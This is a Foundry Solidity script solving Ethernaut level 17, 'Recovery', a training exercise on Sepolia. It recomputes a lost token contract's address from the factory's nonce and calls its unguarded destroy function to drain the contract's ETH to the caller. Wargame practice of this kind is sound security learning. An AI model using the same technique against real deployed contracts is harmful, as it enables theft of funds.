// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/Recovery.sol";

/*
    Solution script for the Ethernaut Level 17: Recovery

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in RecoveryScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/Recovery.s.sol:RecoveryScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/Recovery.s.sol/11155111
*/

contract RecoveryScript is Script {
    // replace instance with your level1 instance adddress
    
    // Recovery Token Factory contract address instance 
    address instance = 0x70FDa073327c232B6Cf89994236394EE48651293;

    function run() external {
        vm.startBroadcast();

        uint256 balance = msg.sender.balance;

        /*
            Calculate the address of the contract deployed by the Recovery Token Factory contract
            Assume it was the first contract deployed by the factory so the nonce is 1.

            This means that the new address will be the rightmost 160 bits of the keccak256 hash of 
            theRLP encoding of sender/creator_address and their nonce.

            An RLP address will have the first byte 0xd6 and the second byte 0x94 followed by the factory address and the nonce.
        */
        address payable lostContract = payable(
            address(
                uint160(
                    uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(instance), bytes1(0x01))))
                )
            )
        );

        // console.log("msg.sender.balance: ", msg.sender.balance);
        // console.log("lostcontract.balance: ", lostContract.balance);

        SimpleToken level17 = SimpleToken(lostContract);
        level17.destroy(payable(msg.sender));

        require(lostContract.balance == 0, "lost contract still has ETH");
        require(msg.sender.balance > balance, "player balance not increased");

        // console.log("msg.sender.balance: ", msg.sender.balance);
        // console.log("lostcontract.balance: ", lostContract.balance);

        vm.stopBroadcast();
    }
}